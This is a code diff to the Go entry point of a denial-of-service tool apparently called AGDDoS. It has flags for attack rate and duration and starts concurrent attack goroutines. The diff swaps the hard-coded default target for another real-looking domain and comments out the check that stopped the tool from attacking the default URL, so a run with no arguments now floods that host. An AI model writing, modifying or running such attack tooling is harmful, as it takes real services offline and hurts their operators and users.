@@ -2,7 +2,6 @@ package main
 
 import (
 	"flag"
-	"log"
 	"os"
 	"runtime"
 	"time"
@@ -16,9 +15,7 @@ var (
 
 // Main Function / 主函数
 func main() {
-	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
-	printWelcome()
-	SetupCloseHandler()
+	defaultTargetUrl := "https://xmr.xn--9tr.com/"
 	runtime.GC() // Clean up memory to prevent memory overflow
 	// Parse Flags / 解析命令行参数
 	printVersion := flag.Bool("v", false, "Print version and exit")
@@ -28,16 +25,19 @@ func main() {
 	flag.IntVar(&IntervalMillisecond, "ims", 100, "Frequency of attacks per thread(ms)")
 	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
 	flag.Parse()
-
+	SetupCloseHandler()
 	if *printVersion {
 		printVer()
 		os.Exit(0)
+	} else {
+		printWelcome()
 	}
-
-	if TargetUrl == defaultTargetUrl {
-		log.Printf("TargetUrl is %s. Please try to start by retransmitting parameters from the command line (TargetUrl != defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
-		return
-	}
+	/*
+		if TargetUrl == defaultTargetUrl {
+			log.Printf("TargetUrl is %s. Please try to start by retransmitting parameters from the command line (TargetUrl != defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
+			return
+		}
+	*/
 	go func() {
 		for i := 0; i < ConcurrencyCount; i++ {
 			go DoAttacking(i)
